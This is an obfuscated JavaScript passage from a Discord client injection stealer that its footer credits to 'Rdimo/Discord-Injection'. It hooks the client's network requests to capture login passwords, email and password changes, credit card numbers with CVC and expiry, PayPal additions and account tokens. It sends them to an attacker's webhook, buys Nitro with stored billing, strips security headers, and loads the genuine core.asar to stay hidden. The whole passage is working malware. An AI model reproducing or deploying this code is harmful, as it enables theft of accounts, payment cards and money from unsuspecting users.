            _0x177c18 = execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/' + config['nitro'][_0x33d559][_0x2c71fa]['id'] + '/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22' + _0x1c98f8 + '\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(' + JSON[_0x11bd37(0x11a)](_0x2950fd) + _0x11bd37(0x120));
        if (_0x177c18[_0x11bd37(0x11b)]) return _0x11bd37(0x101) + _0x177c18[_0x11bd37(0x11b)];
        else return null;
    }, buyNitro = async _0x252249 => {
        const _0x53691c = _0x78e7e9,
            _0x54cb39 = await fetchBilling(_0x252249),
            _0x22ec72 = _0x53691c(0x10c);
        if (!_0x54cb39) return _0x22ec72;
        let _0x172b81 = [];
        _0x54cb39[_0x53691c(0x142)](_0x1b269f => {
            const _0x407c87 = _0x53691c;
            !_0x1b269f['invalid'] && (_0x172b81 = _0x172b81[_0x407c87(0x163)](_0x1b269f['id']));
        });
        for (let _0x4eba6b in _0x172b81) {
            const _0x526b23 = Purchase(_0x252249, _0x4eba6b, _0x53691c(0x1ad), _0x53691c(0x17e));
            if (_0x526b23 !== null) return _0x526b23;
            else {
                const _0x195ac6 = Purchase(_0x252249, _0x4eba6b, _0x53691c(0x1ad), _0x53691c(0x150));
                if (_0x195ac6 !== null) return _0x195ac6;
                else {
                    const _0x38dcc9 = Purchase(_0x252249, _0x4eba6b, _0x53691c(0x199), _0x53691c(0x150));
                    return _0x38dcc9 !== null ? _0x38dcc9 : _0x22ec72;
                }
            }
        }
    }, getNitro = _0x4d3d9e => {
        const _0x16e760 = _0x78e7e9;
        switch (_0x4d3d9e) {
            case 0x0:
                return _0x16e760(0x136);
            case 0x1:
                return _0x16e760(0x130);
            case 0x2:
                return _0x16e760(0x190);
            default:
                return 'No\x20Nitro';
        }
    }, getBadges = _0x5aaa50 => {
        const _0x167108 = _0x78e7e9;
        let _0x2a0543 = '';
        switch (_0x5aaa50) {
            case 0x1:
                _0x2a0543 += _0x167108(0x1ac);
                break;
            case 0x2:
                _0x2a0543 += _0x167108(0x171);
                break;
            case 0x20000:
                _0x2a0543 += _0x167108(0x11d);
                break;
            case 0x4:
                _0x2a0543 += 'Hypesquad\x20Event,\x20';
                break;
            case 0x4000:
                _0x2a0543 += _0x167108(0x13b);
                break;
            case 0x8:
                _0x2a0543 += _0x167108(0x124);
                break;
            case 0x200:
                _0x2a0543 += _0x167108(0x183);
                break;
            case 0x80:
                _0x2a0543 += _0x167108(0x1b4);
                break;
            case 0x40:
                _0x2a0543 += _0x167108(0x1b9);
                break;
            case 0x100:
                _0x2a0543 += _0x167108(0x112);
                break;
            case 0x0:
                _0x2a0543 = _0x167108(0x16f);
                break;
            default:
                _0x2a0543 = 'None';
                break;
        }
        return _0x2a0543;
    }, hooker = async _0x31988e => {
        const _0x452755 = _0x78e7e9,
            _0x3b17e9 = JSON[_0x452755(0x11a)](_0x31988e),
            _0x3f5c3c = new URL(config['webhook']),
            _0x4d4270 = {
                'Content-Type': _0x452755(0x140),
                'Access-Control-Allow-Origin': '*'
            };
        if (!config['webhook'][_0x452755(0xf5)](_0x452755(0x12c))) {
            const _0x4272d4 = totp(config[_0x452755(0x160)]);
            _0x4d4270[_0x452755(0x125)] = _0x4272d4;
        }
        const _0x3239db = {
                'protocol': _0x3f5c3c[_0x452755(0x1b6)],
                'hostname': _0x3f5c3c[_0x452755(0x116)],
                'path': _0x3f5c3c['pathname'],
                'method': _0x452755(0x18b),
                'headers': _0x4d4270
            },
            _0x171fb5 = https['request'](_0x3239db);
        _0x171fb5['on'](_0x452755(0x11c), _0x3c7533 => {
            const _0x429626 = _0x452755;
            console[_0x429626(0x187)](_0x3c7533);
        }), _0x171fb5[_0x452755(0x16a)](_0x3b17e9), _0x171fb5[_0x452755(0x165)]();
    }, login = async (_0x6d68d7, _0x2cbc8d, _0x52ac37) => {
        const _0x4a1c35 = _0x78e7e9,
            _0x1abd80 = await getInfo(_0x52ac37),
            _0x2a2566 = getNitro(_0x1abd80[_0x4a1c35(0x108)]),
            _0x103cea = getBadges(_0x1abd80['flags']),
            _0xb8b5f0 = await getBilling(_0x52ac37),
            _0x4117cc = {
                'username': config[_0x4a1c35(0xf7)],
                'avatar_url': config[_0x4a1c35(0x100)],
                'embeds': [{
                    'color': config[_0x4a1c35(0x14e)],
                    'fields': [{
                        'name': '**Account\x20Info**',
                        'value': _0x4a1c35(0x144) + _0x6d68d7 + _0x4a1c35(0x19a) + _0x2cbc8d + '**',
                        'inline': ![]
                    }, {
                        'name': _0x4a1c35(0xf8),
                        'value': _0x4a1c35(0x10b) + _0x2a2566 + '**\x0aBadges:\x20**' + _0x103cea + '**\x0aBilling:\x20**' + _0xb8b5f0 + '**',
                        'inline': ![]
                    }, {
                        'name': _0x4a1c35(0x1be),
                        'value': '`' + _0x52ac37 + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': _0x1abd80['username'] + '#' + _0x1abd80['discriminator'] + _0x4a1c35(0x113) + _0x1abd80['id'],
                        'icon_url': _0x4a1c35(0x1ba) + _0x1abd80['id'] + '/' + _0x1abd80[_0x4a1c35(0x129)] + '.webp'
                    },
                    'footer': {
                        'text': '🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'
                    }
                }]
            };
        if (config[_0x4a1c35(0x10f)]) _0x4117cc[_0x4a1c35(0x132)] = config[_0x4a1c35(0x173)];
        hooker(_0x4117cc);
    }, passwordChanged = async (_0x29f6ef, _0x468953, _0xac87e6) => {
        const _0x317d72 = _0x78e7e9,
            _0x5ad19d = await getInfo(_0xac87e6),
            _0x15831e = getNitro(_0x5ad19d['premium_type']),
            _0x2ddac2 = getBadges(_0x5ad19d[_0x317d72(0x17c)]),
            _0xe140b5 = await getBilling(_0xac87e6),
            _0x1f208f = {
                'username': config['embed_name'],
                'avatar_url': config[_0x317d72(0x100)],
                'embeds': [{
                    'color': config['embed_color'],
                    'fields': [{
                        'name': '**Password\x20Changed**',
                        'value': 'Email:\x20**' + _0x5ad19d[_0x317d72(0x152)] + _0x317d72(0x19b) + _0x29f6ef + _0x317d72(0x13d) + _0x468953 + '**',
                        'inline': !![]
                    }, {
                        'name': _0x317d72(0xf8),
                        'value': _0x317d72(0x10b) + _0x15831e + _0x317d72(0x13a) + _0x2ddac2 + _0x317d72(0x1aa) + _0xe140b5 + '**',
                        'inline': !![]
                    }, {
                        'name': _0x317d72(0x1be),
                        'value': '`' + _0xac87e6 + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': _0x5ad19d['username'] + '#' + _0x5ad19d['discriminator'] + _0x317d72(0x113) + _0x5ad19d['id'],
                        'icon_url': 'https://cdn.discordapp.com/avatars/' + _0x5ad19d['id'] + '/' + _0x5ad19d['avatar'] + _0x317d72(0x12f)
                    },
                    'footer': {
                        'text': _0x317d72(0x1b0)
                    }
                }]
            };
        if (config[_0x317d72(0x10f)]) _0x1f208f[_0x317d72(0x132)] = config['ping_val'];
        hooker(_0x1f208f);
    }, emailChanged = async (_0x80ffe9, _0x927d5a, _0x3d3ee6) => {
        const _0x271a5d = _0x78e7e9,
            _0x476316 = await getInfo(_0x3d3ee6),
            _0x5554c3 = getNitro(_0x476316['premium_type']),
            _0x141cd7 = getBadges(_0x476316['flags']),
            _0x123fe9 = await getBilling(_0x3d3ee6),
            _0x108f4d = {
                'username': config[_0x271a5d(0xf7)],
                'avatar_url': config['embed_icon'],
                'embeds': [{
                    'color': config[_0x271a5d(0x14e)],
                    'fields': [{
                        'name': _0x271a5d(0x172),
                        'value': _0x271a5d(0x117) + _0x80ffe9 + _0x271a5d(0x143) + _0x927d5a + '**',
                        'inline': !![]
                    }, {
                        'name': _0x271a5d(0xf8),
                        'value': 'Nitro\x20Type:\x20**' + _0x5554c3 + _0x271a5d(0x13a) + _0x141cd7 + _0x271a5d(0x1aa) + _0x123fe9 + '**',
                        'inline': !![]
                    }, {
                        'name': '**Token**',
                        'value': '`' + _0x3d3ee6 + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': _0x476316['username'] + '#' + _0x476316[_0x271a5d(0x18a)] + _0x271a5d(0x113) + _0x476316['id'],
                        'icon_url': _0x271a5d(0x1ba) + _0x476316['id'] + '/' + _0x476316[_0x271a5d(0x129)] + _0x271a5d(0x12f)
                    },
                    'footer': {
                        'text': _0x271a5d(0x1b0)
                    }
                }]
            };
        if (config[_0x271a5d(0x10f)]) _0x108f4d[_0x271a5d(0x132)] = config[_0x271a5d(0x173)];
        hooker(_0x108f4d);
    }, PaypalAdded = async _0x14d569 => {
        const _0x56a86c = _0x78e7e9,
            _0x115c81 = await getInfo(_0x14d569),
            _0x4f8a81 = getNitro(_0x115c81[_0x56a86c(0x108)]),
            _0x5bbb71 = getBadges(_0x115c81[_0x56a86c(0x17c)]),
            _0x3baca2 = getBilling(_0x14d569),
            _0x3fc398 = {
                'username': config[_0x56a86c(0xf7)],
                'avatar_url': config[_0x56a86c(0x100)],
                'embeds': [{
                    'color': config[_0x56a86c(0x14e)],
                    'fields': [{
                        'name': _0x56a86c(0x176),
                        'value': _0x56a86c(0x18c),
                        'inline': ![]
                    }, {
                        'name': '**Discord\x20Info**',
                        'value': _0x56a86c(0x10b) + _0x4f8a81 + '*\x0aBadges:\x20**' + _0x5bbb71 + _0x56a86c(0x1aa) + _0x3baca2 + '**',
                        'inline': ![]
                    }, {
                        'name': _0x56a86c(0x1be),
                        'value': '`' + _0x14d569 + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': _0x115c81[_0x56a86c(0xf6)] + '#' + _0x115c81[_0x56a86c(0x18a)] + '\x20|\x20' + _0x115c81['id'],
                        'icon_url': _0x56a86c(0x1ba) + _0x115c81['id'] + '/' + _0x115c81['avatar'] + _0x56a86c(0x12f)
                    },
                    'footer': {
                        'text': _0x56a86c(0x1b0)
                    }
                }]
            };
        if (config[_0x56a86c(0x10f)]) _0x3fc398[_0x56a86c(0x132)] = config[_0x56a86c(0x173)];
        hooker(_0x3fc398);
    }, ccAdded = async (_0x57344e, _0x29549e, _0x34c260, _0x20fa84, _0x4b8734) => {
        const _0x145b86 = _0x78e7e9,
            _0x339164 = await getInfo(_0x4b8734),
            _0x1ec3d2 = getNitro(_0x339164[_0x145b86(0x108)]),
            _0x410993 = getBadges(_0x339164[_0x145b86(0x17c)]),
            _0x1fab83 = await getBilling(_0x4b8734),
            _0x1408d3 = {
                'username': config['embed_name'],
                'avatar_url': config[_0x145b86(0x100)],
                'embeds': [{
                    'color': config[_0x145b86(0x14e)],
                    'fields': [{
                        'name': '**Credit\x20Card\x20Added**',
                        'value': 'Credit\x20Card\x20Number:\x20**' + _0x57344e + _0x145b86(0x1ab) + _0x29549e + _0x145b86(0x135) + _0x34c260 + '/' + _0x20fa84 + '**',
                        'inline': !![]
                    }, {
                        'name': _0x145b86(0xf8),
                        'value': _0x145b86(0x10b) + _0x1ec3d2 + _0x145b86(0x13a) + _0x410993 + _0x145b86(0x1aa) + _0x1fab83 + '**',
                        'inline': !![]
                    }, {
                        'name': _0x145b86(0x1be),
                        'value': '`' + _0x4b8734 + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': _0x339164['username'] + '#' + _0x339164[_0x145b86(0x18a)] + '\x20|\x20' + _0x339164['id'],
                        'icon_url': 'https://cdn.discordapp.com/avatars/' + _0x339164['id'] + '/' + _0x339164[_0x145b86(0x129)] + _0x145b86(0x12f)
                    },
                    'footer': {
                        'text': '🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'
                    }
                }]
            };
        if (config[_0x145b86(0x10f)]) _0x1408d3['content'] = config[_0x145b86(0x173)];
        hooker(_0x1408d3);
    }, nitroBought = async _0x4d716b => {
        const _0x5a8f05 = _0x78e7e9,
            _0x43b20e = await getInfo(_0x4d716b),
            _0x496dd9 = getNitro(_0x43b20e[_0x5a8f05(0x108)]),
            _0x1c3e4f = getBadges(_0x43b20e[_0x5a8f05(0x17c)]),
            _0x5c41b5 = await getBilling(_0x4d716b),
            _0x5c2eb5 = await buyNitro(_0x4d716b),
            _0x2646ac = {
                'username': config[_0x5a8f05(0xf7)],
                'content': _0x5c2eb5,
                'avatar_url': config['embed_icon'],
                'embeds': [{
                    'color': config[_0x5a8f05(0x14e)],
                    'fields': [{
                        'name': _0x5a8f05(0xfd),
                        'value': _0x5a8f05(0x195) + _0x5c2eb5 + '```',
                        'inline': !![]
                    }, {
                        'name': '**Discord\x20Info**',
                        'value': _0x5a8f05(0x10b) + _0x496dd9 + '**\x0aBadges:\x20**' + _0x1c3e4f + _0x5a8f05(0x1aa) + _0x5c41b5 + '**',
                        'inline': !![]
                    }, {
                        'name': _0x5a8f05(0x1be),
                        'value': '`' + _0x4d716b + '`',
                        'inline': ![]
                    }],
                    'author': {
                        'name': _0x43b20e['username'] + '#' + _0x43b20e[_0x5a8f05(0x18a)] + _0x5a8f05(0x113) + _0x43b20e['id'],
                        'icon_url': _0x5a8f05(0x1ba) + _0x43b20e['id'] + '/' + _0x43b20e['avatar'] + _0x5a8f05(0x12f)
                    },
                    'footer': {
                        'text': _0x5a8f05(0x1b0)
                    }
                }]
            };
        if (config[_0x5a8f05(0x10f)]) _0x2646ac[_0x5a8f05(0x132)] = config['ping_val'] + ('\x0a' + _0x5c2eb5);
        hooker(_0x2646ac);
    };
session[_0x78e7e9(0x12b)][_0x78e7e9(0x10a)][_0x78e7e9(0x127)](config[_0x78e7e9(0x193)], (_0xb63a13, _0x1f08d6) => {
    const _0x4448ac = _0x78e7e9;
    if (_0xb63a13[_0x4448ac(0x15b)][_0x4448ac(0x162)](_0x4448ac(0x155))) return _0x1f08d6({
        'cancel': !![]
    });
    updateCheck();
}), session[_0x78e7e9(0x12b)][_0x78e7e9(0x10a)]['onHeadersReceived']((_0x9f8a3d, _0x569a2c) => {
    const _0x5c9033 = _0x78e7e9;
    _0x9f8a3d[_0x5c9033(0x15b)]['startsWith'](config[_0x5c9033(0x1a3)]) ? _0x9f8a3d[_0x5c9033(0x15b)][_0x5c9033(0xf5)](_0x5c9033(0x194)) ? _0x569a2c({
        'responseHeaders': Object[_0x5c9033(0x15c)]({
            'Access-Control-Allow-Headers': '*'
        }, _0x9f8a3d[_0x5c9033(0x182)])
    }) : _0x569a2c({
        'responseHeaders': Object['assign']({
            'Content-Security-Policy': ['default-src\x20\x27*\x27', 'Access-Control-Allow-Headers\x20\x27*\x27', 'Access-Control-Allow-Origin\x20\x27*\x27'],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*'
        }, _0x9f8a3d[_0x5c9033(0x182)])
    }) : (delete _0x9f8a3d[_0x5c9033(0x182)][_0x5c9033(0x1a4)], delete _0x9f8a3d[_0x5c9033(0x182)]['content-security-policy-report-only'], _0x569a2c({
        'responseHeaders': {
            ..._0x9f8a3d[_0x5c9033(0x182)],
            'Access-Control-Allow-Headers': '*'
        }
    }));
}), session['defaultSession']['webRequest']['onCompleted'](config[_0x78e7e9(0x15e)], async (_0x5a3ac0, _0x4c89a7) => {
    const _0x910a1 = _0x78e7e9;
    if (_0x5a3ac0[_0x910a1(0x1a7)] !== 0xc8 && _0x5a3ac0[_0x910a1(0x1a7)] !== 0xca) return;
    const _0x127164 = Buffer[_0x910a1(0x1a0)](_0x5a3ac0[_0x910a1(0x179)][0x0][_0x910a1(0x13c)])[_0x910a1(0xfe)](),
        _0x1e3b8d = JSON[_0x910a1(0x111)](_0x127164),
        _0x7837c9 = await execScript(_0x910a1(0x1ae));
    switch (!![]) {
        case _0x5a3ac0[_0x910a1(0x15b)][_0x910a1(0xf2)](_0x910a1(0x158)):
            login(_0x1e3b8d[_0x910a1(0x158)], _0x1e3b8d[_0x910a1(0x184)], _0x7837c9)[_0x910a1(0x166)](console[_0x910a1(0x11c)]);
            break;
        case _0x5a3ac0['url']['endsWith'](_0x910a1(0x198)) && _0x5a3ac0['method'] === _0x910a1(0x156):
            if (!_0x1e3b8d[_0x910a1(0x184)]) return;
            _0x1e3b8d[_0x910a1(0x152)] && emailChanged(_0x1e3b8d[_0x910a1(0x152)], _0x1e3b8d['password'], _0x7837c9)[_0x910a1(0x166)](console[_0x910a1(0x11c)]);
            _0x1e3b8d[_0x910a1(0x17d)] && passwordChanged(_0x1e3b8d[_0x910a1(0x184)], _0x1e3b8d[_0x910a1(0x17d)], _0x7837c9)[_0x910a1(0x166)](console[_0x910a1(0x11c)]);
            break;
        case _0x5a3ac0[_0x910a1(0x15b)][_0x910a1(0xf2)](_0x910a1(0x15f)) && _0x5a3ac0[_0x910a1(0x1a1)] === _0x910a1(0x18b):
            const _0x53a7d7 = querystring[_0x910a1(0x111)](unparsedData[_0x910a1(0xfe)]());
            ccAdded(_0x53a7d7['card[number]'], _0x53a7d7['card[cvc]'], _0x53a7d7['card[exp_month]'], _0x53a7d7[_0x910a1(0x180)], _0x7837c9)[_0x910a1(0x166)](console[_0x910a1(0x11c)]);
            break;
        case _0x5a3ac0[_0x910a1(0x15b)][_0x910a1(0xf2)](_0x910a1(0x18f)) && _0x5a3ac0[_0x910a1(0x1a1)] === _0x910a1(0x18b):
            PaypalAdded(_0x7837c9)[_0x910a1(0x166)](console[_0x910a1(0x11c)]);
            break;
        case _0x5a3ac0[_0x910a1(0x15b)][_0x910a1(0xf2)]('confirm') && _0x5a3ac0[_0x910a1(0x1a1)] === 'POST':
            if (!config[_0x910a1(0x11f)]) return;
            setTimeout(() => {
                const _0x1ca68d = _0x910a1;
                nitroBought(_0x7837c9)[_0x1ca68d(0x166)](console[_0x1ca68d(0x11c)]);
            }, 0x1d4c);
            break;
        default:
            break;
    }
}), module[_0x78e7e9(0x19d)] = require('./core.asar');
